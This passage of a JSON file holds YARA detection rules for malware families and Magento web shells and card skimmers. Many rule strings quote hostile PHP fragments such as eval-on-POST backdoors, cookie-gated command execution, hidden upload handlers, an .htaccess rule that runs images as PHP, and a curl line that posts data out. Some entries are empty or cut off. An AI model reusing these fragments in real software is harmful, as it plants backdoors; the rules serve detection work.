ascii\n\n\t\t$type3=\"Microsoft-Windows-Security-Auditing\" wide ascii\n\t\t$eventid3=\"4689\" wide ascii\n\t\t$data3=\"Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\" wide ascii\n\n\n\tcondition:\n\t\tall of them\n}",
  "Kraken_Bot_Sample": "rule Kraken_Bot_Sample : bot {\n\tmeta:\n\t\tdescription = \"Kraken Bot Sample - file inf.bin\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html\"\n\t\tdate = \"2015-05-07\"\n\t\thash = \"798e9f43fc199269a3ec68980eb4d91eb195436d\"\n\t\tscore = 90\n\tstrings:\n\t\t$s2 = \"%s=?getname\" fullword ascii\n\t\t$s4 = \"&COMPUTER=^\" fullword ascii\n\t\t$s5 = \"xJWFwcGRhdGElAA=\" fullword ascii /* base64 encoded string '%appdata%' */\n\t\t$s8 = \"JVdJTkRJUi\" fullword ascii /* base64 encoded string '%WINDIR' */\n\t\t$s20 = \"btcplug\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of them\n}",
  "Kwampirs": "rule Kwampirs\n{\n meta:\n copyright = \"Symantec\"\n reference = \"https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia\"\n family = \"Kwampirs\"\n description = \"Kwampirs dropper and main payload components\"\n strings:\n$pubkey =\n {\n 06 02 00 00 00 A4 00 00 52 53 41 31 00 08 00 00\n 01 00 01 00 CD 74 15 BC 47 7E 0A 5E E4 35 22 A5\n 97 0C 65 BE E0 33 22 F2 94 9D F5 40 97 3C 53 F9\n E4 7E DD 67 CF 5F 0A 5E F4 AD C9 CF 27 D3 E6 31\n 48 B8 00 32 1D BE 87 10 89 DA 8B 2F 21 B4 5D 0A\n CD 43 D7 B4 75 C9 19 FE CC 88 4A 7B E9 1D 8C 11\n 56 A6 A7 21 D8 C6 82 94 C1 66 11 08 E6 99 2C 33\n 02 E2 3A 50 EA 58 D2 A7 36 EE 5A D6 8F 5D 5D D2\n 9E 04 24 4A CE 4C B6 91 C0 7A C9 5C E7 5F 51 28\n 4C 72 E1 60 AB 76 73 30 66 18 BE EC F3 99 5E 4B\n 4F 59 F5 56 AD 65 75 2B 8F 14 0C 0D 27 97 12 71\n 6B 49 08 84 61 1D 03 BA A5 42 92 F9 13 33 57 D9\n 59 B3 E4 05 F9 12 23 08 B3 50 9A DA 6E 79 02 36\n EE CE 6D F3 7F 8B C9 BE 6A 7E BE 8F 85 B8 AA 82\n C6 1E 14 C6 1A 28 29 59 C2 22 71 44 52 05 E5 E6\n FE 58 80 6E D4 95 2D 57 CB 99 34 61 E9 E9 B3 3D\n 90 DC 6C 26 5D 70 B4 78 F9 5E C9 7D 59 10 61 DF\n F7 E4 0C B3\n }\n \n $network_xor_key =\n {\n B7 E9 F9 2D F8 3E 18 57 B9 18 2B 1F 5F D9 A5 38\n C8 E7 67 E9 C6 62 9C 50 4E 8D 00 A6 59 F8 72 E0\n 91 42 FF 18 A6 D1 81 F2 2B C8 29 EB B9 87 6F 58\n C2 C9 8E 75 3F 71 ED 07 D0 AC CE 28 A1 E7 B5 68\n CD CF F1 D8 2B 26 5C 31 1E BC 52 7C 23 6C 3E 6B\n 8A 24 61 0A 17 6C E2 BB 1D 11 3B 79 E0 29 75 02\n D9 25 31 5F 95 E7 28 28 26 2B 31 EC 4D B3 49 D9\n 62 F0 3E D4 89 E4 CC F8 02 41 CC 25 15 6E 63 1B\n 10 3B 60 32 1C 0D 5B FA 52 DA 39 DF D1 42 1E 3E\n BD BC 17 A5 96 D9 43 73 3C 09 7F D2 C6 D4 29 83\n 3E 44 44 6C 97 85 9E 7B F0 EE 32 C3 11 41 A3 6B\n A9 27 F4 A3 FB 2B 27 2B B6 A6 AF 6B 39 63 2D 91\n 75 AE 83 2E 1E F8 5F B5 65 ED B3 40 EA 2A 36 2C\n A6 CF 8E 4A 4A 3E 10 6C 9D 28 49 66 35 83 30 E7\n 45 0E 05 ED 69 8D CF C5 40 50 B1 AA 13 74 33 0F\n DF 41 82 3B 1A 79 DC 3B 9D C3 BD EA B1 3E 04 33\n }\n\n$decrypt_string =\n {\n 85 DB 75 09 85 F6 74 05 89 1E B0 01 C3 85 FF 74\n 4F F6 C3 01 75 4A 85 F6 74 46 8B C3 D1 E8 33 C9\n 40 BA 02 00 00 00 F7 E2 0F 90 C1 F7 D9 0B C8 51\n E8 12 28 00 00 89 06 8B C8 83 C4 04 33 C0 85 DB\n 74 16 8B D0 83 E2 0F 8A 92 1C 33 02 10 32 14 38\n 40 88 11 41 3B C3 72 EA 66 C7 01 00 00 B0 01 C3\n 32 C0 C3\n }\n\n $init_strings =\n {\n 55 8B EC 83 EC 10 33 C9 B8 0D 00 00 00 BA 02 00\n 00 00 F7 E2 0F 90 C1 53 56 57 F7 D9 0B C8 51 E8\n B3 27 00 00 BF 05 00 00 00 8D 77 FE BB 4A 35 02\n 10 2B DE 89 5D F4 BA 48 35 02 10 4A BB 4C 35 02\n 10 83 C4 04 2B DF A3 C8 FC 03 10 C7 45 FC 00 00\n 00 00 8D 4F FC 89 55 F8 89 5D F0 EB 06\n }\n\n condition:\n 2 of them\n}",
  "SharedStrings": "rule SharedStrings : Family {\n\tmeta:\n\t\tdescription = \"Internal names found in LURK0/CCTV0 samples\"\n\t\tauthor = \"Katie Kleemola\"\n\t\tlast_updated = \"07-22-2014\"\n\t\n\tstrings:\n\t\t// internal names\n\t\t$i1 = \"Butterfly.dll\"\n\t\t$i2 = /\\\\BT[0-9.]+\\\\ButterFlyDLL\\\\/\n\t\t$i3 = \"ETClientDLL\"\n\n\t\t// dbx\n\t\t$d1 = \"\\\\DbxUpdateET\\\\\" wide\n\t\t$d2 = \"\\\\DbxUpdateBT\\\\\" wide\n\t\t$d3 = \"\\\\DbxUpdate\\\\\" wide\n\t\t\n\t\t// other folders\n\t\t$mc1 = \"\\\\Micet\\\\\"\n\n\t\t// embedded file names\n\t\t$n1 = \"IconCacheEt.dat\" wide\n\t\t$n2 = \"IconConfigEt.dat\" wide\n\n\t\t$m1 = \"\\x00\\x00ERXXXXXXX\\x00\\x00\" wide\n\t\t$m2 = \"\\x00\\x00111\\x00\\x00\" wide\n\t\t$m3 = \"\\x00\\x00ETUN\\x00\\x00\" wide\n\t\t$m4 = \"\\x00\\x00ER\\x00\\x00\" wide\n\n\tcondition:\n\t\tany of them //todo: finetune this\n\n}",
  "lateral_movement": "rule lateral_movement\n{ \n\tmeta:\n\t\tdate = \"3/12/2014\"\n\t\tauthor = \"https://github.com/reed1713\"\n    description = \"methodology sig looking for signs of lateral movement\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=\"PsExec.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"Windows\\\\System32\\\\net.exe\"\n\n\t\t$type2=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid2=\"4688\"\n\t\t$data2=\"Windows\\\\System32\\\\at.exe\"\n\tcondition:\n\t\t($type and $eventid and $data) or ($type1 and $eventid1 and $data1) or ($type2 and $eventid2 and $data2)\n}",
  "VisualDiscovery_Lonovo_Superfish_SSL_Hijack": "rule VisualDiscovery_Lonovo_Superfish_SSL_Hijack {\n\tmeta:\n\t\tdescription = \"Lenovo Superfish SSL Interceptor - file VisualDiscovery.exe\"\n\t\tauthor = \"Florian Roth / improved by kbandla\"\n\t\treference = \"https://twitter.com/4nc4p/status/568325493558272000\"\n\t\tdate = \"2015/02/19\"\n\t\thash1 = \"99af9cfc7ab47f847103b5497b746407dc566963\"\n\t\thash2 = \"f0b0cd0227ba302ac9ab4f30d837422c7ae66c46\"\n\t\thash3 = \"f12edf2598d8f0732009c5cd1df5d2c559455a0b\"\n\t\thash4 = \"343af97d47582c8150d63cbced601113b14fcca6\"\n\tstrings:\n\t\t$mz = { 4d 5a }\n\t\t//$s1 = \"VisualDiscovery.exe\" fullword wide\n\t\t$s2 = \"Invalid key length used to initialize BlowFish.\" fullword ascii\n\t\t$s3 = \"GetPCProxyHandler\" fullword ascii\n\t\t$s4 = \"StartPCProxy\" fullword ascii\n\t\t$s5 = \"SetPCProxyHandler\" fullword ascii\n\tcondition:\n\t\t( $mz at 0 ) and filesize < 2MB and all of ($s*)\n}",
  "LinuxBew": "rule LinuxBew: MALW\n{\n\tmeta:\n\t\tdescription = \"Linux.Bew Backdoor\"\n\t\tauthor = \"Joan Soriano / @w0lfvan\"\n\t\tdate = \"2017-07-10\"\n\t\tversion = \"1.0\"\n\t\tMD5 = \"27d857e12b9be5d43f935b8cc86eaabf\"\n\t\tSHA256 = \"80c4d1a1ef433ac44c4fe72e6ca42395261fbca36eff243b07438263a1b1cf06\"\n\tstrings:\n\t\t$a = \"src/secp256k1.c\"\n\t\t$b = \"hfir.u230.org\"\n\t\t$c = \"tempfile-x11session\"\n\tcondition:\n\t\tall of them\n}",
  "LinuxHelios": "rule LinuxHelios: MALW\n{\n\tmeta:\n\t\tdescription = \"Linux.Helios\"\n\t\tauthor = \"Joan Soriano / @w0lfvan\"\n\t\tdate = \"2017-10-19\"\n\t\tversion = \"1.0\"\n\t\tMD5 = \"1a35193f3761662a9a1bd38b66327f49\"\n\t\tSHA256 = \"72c2e804f185bef777e854fe86cff3e86f00290f32ae8b3cb56deedf201f1719\"\n\tstrings:\n\t\t$a = \"LIKE A GOD!!! IP:%s User:%s Pass:%s\"\n\t\t$b = \"smack\"\n\t\t$c = \"PEACE OUT IMMA DUP\\n\"\n\tcondition:\n\t\tall of them\n}",
  "is_elf": "rule is_elf\n{\n    strings:\n        $header = { 7F 45 4C 46 }\n\n    condition:\n        $header at 0\n}",
  "moose": "rule moose\n{\n    meta:\n        Author      = \"Thomas Dupuy\"\n        Date        = \"2015/04/21\"\n        Description = \"Linux/Moose malware\"\n        Reference   = \"http://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf\"\n        Source = \"https://github.com/eset/malware-ioc/\"\n        Contact = \"github@eset.com\"\n        License = \"BSD 2-Clause\"\n\n    strings:\n        $s0 = \"Status: OK\"\n        $s1 = \"--scrypt\"\n        $s2 = \"stratum+tcp://\"\n        $s3 = \"cmd.so\"\n        $s4 = \"/Challenge\"\n        $s7 = \"processor\"\n        $s9 = \"cpu model\"\n        $s21 = \"password is wrong\"\n        $s22 = \"password:\"\n        $s23 = \"uthentication failed\"\n        $s24 = \"sh\"\n        $s25 = \"ps\"\n        $s26 = \"echo -n -e \"\n        $s27 = \"chmod\"\n        $s28 = \"elan2\"\n        $s29 = \"elan3\"\n        $s30 = \"chmod: not found\"\n        $s31 = \"cat /proc/cpuinfo\"\n        $s32 = \"/proc/%s/cmdline\"\n        $s33 = \"kill %s\"\n\n    condition:\n        is_elf and all of them\n}",
  "lost_door": "rule lost_door : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"23/02/2013\"\n\t\tdescription=\"Lost Door\"\n\t\n\tstrings:\n\t\t$signature1={45 44 49 54 5F 53 45 52 56 45 52} /*EDIT_SERVER*/\n\t\t\n\tcondition:\n\t\t$signature1\n}",
  "LuaBot": "rule LuaBot : MALW\n{\n        meta:\n                description = \"LuaBot\"\n                author = \"Joan Soriano / @joanbtl\"\n                date = \"2017-06-07\"\n                version = \"1.0\"\n                MD5 = \"9df3372f058874fa964548cbb74c74bf\"\n                SHA1 = \"89226865501ee7d399354656d870b4a9c02db1d3\"\n                ref1 = \"http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html\"\n\n        strings:\n                $a = \"LUA_PATH\"\n                $b = \"Hi. Happy reversing, you can mail me: luabot@yandex.ru\"\n                $c = \"/tmp/lua_XXXXXX\"\n                $d = \"NOTIFY\"\n                $e = \"UPDATE\"\n\n        condition:\n                all of them\n}",
  "MSILStealer": "rule MSILStealer\n{\n    meta:\n        description = \"Detects strings from C#/VB Stealers and QuasarRat\"\n        reference = \"https://github.com/quasar/QuasarRAT\"\n        author = \"https://github.com/hwvs\"\n        last_modified = \"2019-11-21\"\n\n    strings:\n        $ = \"Firefox does not have any profiles, has it ever been launched?\" wide ascii\n        $ = \"Firefox is not installed, or the install path could not be located\" wide ascii\n        $ = \"No installs of firefox recorded in its key.\" wide ascii\n        $ = \"{0}\\\\\\\\FileZilla\\\\\\\\recentservers.xml\" wide ascii\n        $ = \"{1}{0}Cookie Name: {2}{0}Value: {3}{0}Path\" wide ascii\n        $ = \"[PRIVATE KEY LOCATION: \\\\\\\"{0}\\\\\\\"]\" wide ascii\n\n    condition:\n        1 of them\n}",
  "MacControl": "rule MacControl : Family\n{\n    meta:\n        description = \"MacControl\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-16\"\n        \n    condition:\n        MacControlCode or MacControlStrings\n}",
  "MacGyverCap": "rule MacGyverCap : MacGyver\n{\n    meta:\n        description = \"Generic rule for MacGyver.cap\"\n        author = \"xylitol@temari.fr\"\n        date = \"2021-05-11\"\n        reference = \"https://github.com/fboldewin/MacGyver-s-return---An-EMV-Chip-cloning-case/blob/master/MacGyver's%20return%20-%20An%20EMV%20Chip%20cloning%20case.pdf\"\n        // May only the challenge guide you\n\t\thash1 = \"9dc70002e82c78ee34c813597925c6cf8aa8d68b7e9ce5bcc70ea9bcab9dbf4a\"\t\t\n    strings:\n        $string1 = \"src/MacGyver/javacard/Header.cap\" ascii wide\n        $string2 = \"src/MacGyver/javacard/Directory.cap\" ascii wide\n\t\t$string3 = \"src/MacGyver/javacard/Applet.cap\" ascii wide\n\t\t$string4 = \"src/MacGyver/javacard/Import.cap\" ascii wide\n\t\t$string5 = \"src/MacGyver/javacard/ConstantPool.cap\" ascii wide\n\t\t$string6 = \"src/MacGyver/javacard/Class.cap\" ascii wide\n\t\t$string7 = \"src/MacGyver/javacard/Method.cap\" ascii wide\n    condition:  \n         all of them\n}",
  "Madness": "rule Madness : DoS {\n    meta:\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        date = \"2014-01-15\"\n        description = \"Identify Madness Pro DDoS Malware\"\n        source = \"https://github.com/arbor/yara/blob/master/madness.yara\"\n    strings:\n        $ua1 = \"TW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBlbi1VUzsgcnY6MS44LjAuNSkgR2Vja28vMjAwNjA3MzEgRmlyZWZveC8xLjUuMC41IEZsb2NrLzAuNy40LjE\"\n        $ua2 = \"TW96aWxsYS81LjAgKFgxMTsgVTsgTGludXggMi40LjItMiBpNTg2OyBlbi1VUzsgbTE4KSBHZWNrby8yMDAxMDEzMSBOZXRzY2FwZTYvNi4wMQ==\"\n        $str1= \"document.cookie=\" fullword\n        $str2 = \"[\\\"cookie\\\",\\\"\" fullword\n        $str3 = \"\\\"realauth=\" fullword\n        $str4 = \"\\\"location\\\"];\" fullword\n        $str5 = \"d3Rm\" fullword\n        $str6 = \"ZXhl\" fullword\n    condition:\n        all of them\n}",
  "dump_sales_quote_payment": "rule dump_sales_quote_payment {\n    strings: $ = \"include '../../../../../../../../../../app/Mage.php'; Mage::app(); $q = Mage::getModel('sales/quote_payment')->getCollection();\"\n    condition: any of them\n}",
  "dump_sales_order": "rule dump_sales_order {\n    strings: $ = \"../../../../../../app/Mage.php'; Mage::app(); var_dump(Mage::getModel('sales/order')\"\n    condition: any of them\n}",
  "md5_64651cede2467fdeb1b3b7e6ff3f81cb": "rule md5_64651cede2467fdeb1b3b7e6ff3f81cb {\n    strings: $ = \"rUl6QttVEP5eqf9usxfJjgoOvdNWFSGoHDgluk+4ONwXQNbGniQLttfyrgkB8d9\"\n    condition: any of them\n}",
  "md5_6bf4910b01aa4f296e590b75a3d25642": "rule md5_6bf4910b01aa4f296e590b75a3d25642 {\n    strings: $ = \"base64_decode('b25lcGFnZXxnY19hZG1pbg==')\"\n    condition: any of them\n}",
  "fopo_webshell": "rule fopo_webshell {\n    strings: \n        $ = \"DNEcHdQbWtXU3dSMDA1VmZ1c29WUVFXdUhPT0xYb0k3ZDJyWmFVZlF5Y0ZEeHV4K2FnVmY0OUtjbzhnc0\"\n        $ = \"U3hkTVVibSt2MTgyRjY0VmZlQWo3d1VlaFJVNVNnSGZUVUhKZXdEbGxJUTlXWWlqWSt0cEtacUZOSXF4c\"\n        $ = \"rb2JHaTJVdURMNlhQZ1ZlTGVjVnFobVdnMk5nbDlvbEdBQVZKRzJ1WmZUSjdVOWNwWURZYlZ0L1BtNCt\"\n    condition: any of them\n}",
  "eval_post": "rule eval_post {\n    strings:\n        $ = \"eval(base64_decode($_POST\"\n        $ = \"eval($undecode($tongji))\"\n        $ = \"eval($_POST\"\n    condition: any of them\n}",
  "spam_mailer": "rule spam_mailer {\n    strings:\n        $ = \"<strong>WwW.Zone-Org</strong>\"\n        $ = \"echo eval(urldecode(\"\n    condition: any of them\n}",
  "md5_0105d05660329704bdb0ecd3fd3a473b": "",
  "md5_0b1bfb0bdc7e017baccd05c6af6943ea": "rule md5_0b1bfb0bdc7e017baccd05c6af6943ea {\n\t/*\n\t\teval(hnsqqh($llmkuhieq, $dbnlftqgr));?>\n\t\teval(vW91692($v7U7N9K, $v5N9NGE));?>\n    */\n    strings: $ = /eval\\([\\w\\d]+\\(\\$[\\w\\d]+, \\$[\\w\\d]+\\)\\);/\n    condition: any of them\n}",
  "md5_2495b460f28f45b40d92da406be15627": "rule md5_2495b460f28f45b40d92da406be15627 {\n    strings: $ = \"$dez = $pwddir.\\\"/\\\".$real;copy($uploaded, $dez);\"\n    condition: any of them\n}",
  "md5_2c37d90dd2c9c743c273cb955dd83ef6": "rule md5_2c37d90dd2c9c743c273cb955dd83ef6 {\n    strings: $ = \"@$_($_REQUEST['\"\n    condition: any of them\n}",
  "md5_3ccdd51fe616c08daafd601589182d38": "rule md5_3ccdd51fe616c08daafd601589182d38 {\n    strings: $ = \"eval(xxtea_decrypt\"\n    condition: any of them\n}",
  "md5_4b69af81b89ba444204680d506a8e0a1": "rule md5_4b69af81b89ba444204680d506a8e0a1 {\n    strings: $ = \"** Scam Redirector\"\n    condition: any of them\n}",
  "md5_71a7c769e644d8cf3cf32419239212c7": "rule md5_71a7c769e644d8cf3cf32419239212c7 {\n\t/*\n    // $GLOBALS['ywanc2']($GLOBALS['ggbdg61']\n    */\n    strings: $ = /\\$GLOBALS\\['[\\w\\d]+'\\]\\(\\$GLOBALS\\['[\\w\\d]+'\\]/\n    condition: any of them\n}",
  "md5_825a3b2a6abbe6abcdeda64a73416b3d": "rule md5_825a3b2a6abbe6abcdeda64a73416b3d {\n\t/*\n    // $ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0 = gethostbyname($_SERVER[\"SERVER_NAME\"]);\n    // if(!oo00o0OOo0o00O(\"fsockopen\"))\n    // strings: $ = \"$ooooo00oo0000oo0\"\n    */\n    strings: $ = /[o0O]{3}\\(\"fsockopen\"\\)/\n    condition: any of them\n}",
  "md5_87cf8209494eedd936b28ff620e28780": "rule md5_87cf8209494eedd936b28ff620e28780 {\n    strings: $ = \"curl_close($cu);eval($o);}",
  "md5_9b59cb5b557e46e1487ef891cedaccf7": "rule md5_9b59cb5b557e46e1487ef891cedaccf7 {\n    strings: \n        $jpg = { FF D8 FF E0 ?? ?? 4A 46 49 46 00 01 }\n\t\t/*\n        // https://en.wikipedia.org/wiki/List_of_file_signatures\n        // magic module is not standard compiled in on our platform\n        // otherwise: condition: magic.mime_type() == /^image/\n        // $jpg = { 4A 46 49 46 00 01 }\n        */\n        $php = \"<?php\"\n    condition: ($jpg at 0) and $php\n}",
  "md5_c647e85ad77fd9971ba709a08566935d": "rule md5_c647e85ad77fd9971ba709a08566935d {\n    strings: $ = \"fopen(\\\"cache.php\\\", \\\"w+\\\")\"\n    condition: any of them\n}",
  "md5_fb9e35bf367a106d18eb6aa0fe406437": "rule md5_fb9e35bf367a106d18eb6aa0fe406437 {\n    strings: $ = \"0B6KVua7D2SLCNDN2RW1ORmhZRWs/sp_tilang.js\"\n    condition: any of them\n}",
  "md5_8e5f7f6523891a5dcefcbb1a79e5bbe9": "rule md5_8e5f7f6523891a5dcefcbb1a79e5bbe9 {\n    strings: $ = \"if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {echo '<b>up!!!</b><br><br>';}}",
  "indoexploit_autoexploiter": "rule indoexploit_autoexploiter {\n    strings: $ = \"echo \\\"IndoXploit - Auto Xploiter\\\"\"\n    condition: any of them\n}",
  "eval_base64_decode_a": "rule eval_base64_decode_a {\n    strings: $ = \"eval(base64_decode($a));\"\n    condition: any of them\n}",
  "obfuscated_eval": "rule obfuscated_eval {\n    strings: \n\t$ = /\\\\x65\\s*\\\\x76\\s*\\\\x61\\s*\\\\x6C/\n\t$ = \"\\\"/.*/e\\\"\"\n    condition: any of them\n}",
  "md5_50be694a82a8653fa8b31d049aac721a": "rule md5_50be694a82a8653fa8b31d049aac721a {\n    strings: $ = \"(preg_match('/\\\\/admin\\\\/Cms_Wysiwyg\\\\/directive\\\\/index\\\\//', $_SERVER['REQUEST_URI']))\"\n    condition: any of them\n}",
  "md5_ab63230ee24a988a4a9245c2456e4874": "rule md5_ab63230ee24a988a4a9245c2456e4874 {\n    strings: $ = \"eval(gzinflate(base64_decode(str_rot13(strrev(\"\n    condition: any of them\n}",
  "md5_b579bff90970ec58862ea8c26014d643": "rule md5_b579bff90970ec58862ea8c26014d643 {\n    /* forces php execution of image files, dropped in an .htaccess file under media */\n    strings: $ = /<Files [^>]+.(jpg|png|gif)>\\s*ForceType application\\/x-httpd-php/\n    condition: any of them\n}",
  "md5_d30b23d1224438518d18e90c218d7c8b": "rule md5_d30b23d1224438518d18e90c218d7c8b {\n    strings: $ = \"attribute_code=0x70617373776f72645f68617368\"\n    condition: any of them\n}",
  "md5_24f2df1b9d49cfb02d8954b08dba471f": "rule md5_24f2df1b9d49cfb02d8954b08dba471f {\n    strings: $ = \"))unlink('../media/catalog/category/'.basename($\"\n    condition: any of them\n}",
  "base64_hidden_in_image": "rule base64_hidden_in_image {\n    strings: $ = /JPEG-1\\.1[a-zA-Z0-9\\-\\/]{32}/\n    condition: any of them\n}",
  "hide_data_in_jpeg": "rule hide_data_in_jpeg {\n    strings: $ = /file_put_contents\\(\\$.{2,3},'JPEG-1\\.1'\\.base64_encode/\n    condition: any of them\n}",
  "hidden_file_upload_in_503": "rule hidden_file_upload_in_503 {\n    strings: $ = /error_reporting\\(0\\);\\$f=\\$_FILES\\[\\w+\\];copy\\(\\$f\\[tmp_name\\],\\$f\\[name\\]\\);error_reporting\\(E_ALL\\);/\n    condition: any of them\n}",
  "md5_fd141197c89d27b30821f3de8627ac38": "",
  "visbot": "rule visbot {\n    strings:\n\t\t$ = \"stripos($buf, 'Visbot')!==false && stripos($buf, 'Pong')!==false\"\n\t\t$ = \"stripos($buf, 'Visbot') !== false && stripos($buf, 'Pong')\"\n    condition: any of them\n}",
  "md5_39ca2651740c2cef91eb82161575348b": "rule md5_39ca2651740c2cef91eb82161575348b {\n    strings: $ = /if\\(md5\\(@\\$_COOKIE\\[..\\]\\)=='.{32}'\\) \\(\\$_=@\\$_REQUEST\\[.\\]\\).@\\$_\\(\\$_REQUEST\\[.\\]\\);/\n    condition: any of them\n}",
  "md5_4c4b3d4ba5bce7191a5138efa2468679": "rule md5_4c4b3d4ba5bce7191a5138efa2468679 {\n    strings:\n        $ = \"<?PHP /*** Magento** NOTICE OF LICENSE** This source file is subject to the Open Software License (OSL 3.0)* that is bundled with this package in the file LICENSE.txt.* It is also available through the world-wide-web at this URL:* http://opensource.org/licenses/osl-3.0.php**/$\"\n        $ = \"$_SERVER['HTTP_USER_AGENT'] == 'Visbot/2.0 (+http://www.visvo.com/en/webmasters.jsp;bot@visvo.com)'\"\n    condition: any of them\n}",
  "md5_6eb201737a6ef3c4880ae0b8983398a9": "rule md5_6eb201737a6ef3c4880ae0b8983398a9 {\n    strings:\n        $ = \"if(md5(@$_COOKIE[qz])==\"\n        $ = \"($_=@$_REQUEST[q]).@$_($_REQUEST[z]);\"\n    condition: all of them\n}",
  "md5_d201d61510f7889f1a47257d52b15fa2": "rule md5_d201d61510f7889f1a47257d52b15fa2 {\n    strings: $ = \"@eval(stripslashes($_REQUEST[q]));\"\n    condition: any of them\n}",
  "md5_06e3ed58854daeacf1ed82c56a883b04": "rule md5_06e3ed58854daeacf1ed82c56a883b04 {\n    strings: $ = \"$log_entry = serialize($ARINFO)\"\n    condition: any of them\n}",
  "md5_28690a72362e021f65bb74eecc54255e": "rule md5_28690a72362e021f65bb74eecc54255e {\n    strings: $ = \"curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array('data'=>$data,'utmp'=>$id)));\"\n    condition: any of them\n}",
  "overwrite_globals_hack": "rule overwrite_globals_hack {\n    strings: $ = /\\$GLOBALS\\['[^']{,20}'\\]=Array\\(/\n    condition: any of them\n}",
  "md5_4adef02197f50b9cc6918aa06132b2f6": "rule md5_4adef02197f50b9cc6918aa06132b2f6 {\n    /* { eval($cco37(${ $kasd1}[ 'n46b398' ] ) );} */\n    strings: $ = /\\{\\s*eval\\s*\\(\\s*\\$.{1,5}\\s*\\(\\$\\{\\s*\\$.{1,5}\\s*\\}\\[\\s*'.{1,10}'\\s*\\]\\s*\\)\\s*\\);\\}/\n    condition: any of them\n}",
  "obfuscated_globals": "rule obfuscated_globals {\n    /* $GLOBALS['y63581'] = \"\\x43 */\n    strings: $ = /\\$GLOBALS\\['.{1,10}'\\] = \"\\\\x/\n    condition: any of them\n}",
  "ld_preload_backdoor": "rule ld_preload_backdoor {\n    strings: $ = \"killall -9 \\\".basename(\\\"/usr/bin/host\"\n    condition: any of them\n}",
  "fake_magentoupdate_site": "rule fake_magentoupdate_site {\n    strings: $ = \"magentopatchupdate.com\"\n    condition: any of them\n}",
  "md5_b3ee7ea209d2ff0d920dfb870bad8ce5": "rule md5_b3ee7ea209d2ff0d920dfb870bad8ce5 {\n    strings:\n        $ = /\\$mysql_key\\s*=\\s*@?base64_decode/\n        $ = /eval\\(\\s*\\$mysql_key\\s*\\)/\n    condition: all of them\n}",
  "md5_e03b5df1fa070675da8b6340ff4a67c2": "",
  "md5_023a80d10d10d911989e115b477e42b5": "rule md5_023a80d10d10d911989e115b477e42b5 {\n    strings: $ = /chr\\(\\d{,3}\\)\\.\\\"\\\"\\.chr\\(\\d{,3}\\)/\n    condition: any of them\n}",
  "md5_4aa900ddd4f1848a15c61a9b7acd5035": "rule md5_4aa900ddd4f1848a15c61a9b7acd5035 {\n    strings: $ = \"'base'.(128/2).'_de'.'code'\"\n    condition: any of them\n}",
  "md5_f797dd5d8e13fe5c8898dbe3beb3cc5b": "rule md5_f797dd5d8e13fe5c8898dbe3beb3cc5b {\n    strings: $ = \"echo(\\\"FILE_Bad\\\");\"\n    condition: any of them\n}",
  "onepage_or_checkout": "rule onepage_or_checkout {\n    strings: $ = \"\\\\x6F\\\\x6E\\\\x65\\\\x70\\\\x61\\\\x67\\\\x65\\\\x7C\\\\x63\\\\x68\\\\x65\\\\x63\\\\x6B\\\\x6F\\\\x75\\\\x74\"\n    condition: any of them\n}",
  "sinlesspleasure_com": "rule sinlesspleasure_com {\n    strings: $ = \"5e908r948q9e605j8t9b915n5o9f8r5e5d969g9d795b4s6p8t9h9f978o8p8s9590936l6k8j9670524p7490915l5f8r90878t917f7g8p8o8p8k9c605i8d937t7m8i8q8o8q959h7p828e7r8e7q7e8m8o5g5e9199918o9g7q7c8c8t99905a5i8l94989h7r7g8i8t8m5f5o92917q7k9i9e948c919h925a5d8j915h608t8p8t9f937b7k9i9e948c919h92\"\n    condition: any of them\n}",
  "amasty_biz": "rule amasty_biz {\n    strings: $ = \"118,97,114,32,115,110,100,32,61,110,117,108,108,59,10,10,102,117\"\n    condition: any of them\n}",
  "amasty_biz_js": "rule amasty_biz_js {\n    strings: $ = \"t_p#0.qlb#0.#1Blsjj#1@#.?#.?dslargml#0.qr_pr#06#07#5@#.?#0\"\n    condition: any of them\n}",
  "returntosender": "rule returntosender {\n    strings: $ = \"\\\\x2F\\\\x6D\\\\x65\\\\x64\\\\x69\\\\x61\\\\x2F\\\\x63\\\\x61\\\\x74\\\\x61\\\\x6C\\\\x6F\\\\x67\\\\x2F\\\\x70\\\\x72\\\\x6F\\\\x64\\\\x75\\\\x63\\\\x74\\\\x2F\\\\x63\\\\x61\\\\x63\\\\x68\\\\x65\\\\x2F\\\\x31\\\\x2F\\\\x74\\\\x68\\\\x75\\\\x6D\\\\x62\\\\x6E\\\\x61\\\\x69\\\\x6C\\\\x2F\\\\x37\\\\x30\\\\x30\\\\x78\\\\x2F\\\\x32\\\\x62\\\\x66\\\\x38\\\\x66\\\\x32\\\\x62\\\\x38\\\\x64\\\\x30\\\\x32\\\\x38\\\\x63\\\\x63\\\\x65\\\\x39\\\\x36\\\\x2F\\\\x42\\\\x2F\\\\x57\\\\x2F\\\\x64\\\\x61\\\\x34\\\\x31\\\\x38\\\\x30\\\\x33\\\\x63\\\\x63\\\\x39\\\\x38\\\\x34\\\\x62\\\\x38\\\\x63\\\\x2E\\\\x70\\\\x68\\\\x70\"\n    condition: any of them\n}",
  "ip_5uu8_com": "rule ip_5uu8_com {\n    strings: $ = \"\\\\x69\\\\x70\\\\x2e\\\\x35\\\\x75\\\\x75\\\\x38\\\\x2e\\\\x63\\\\x6f\\\\x6d\"\n    condition: any of them\n}",
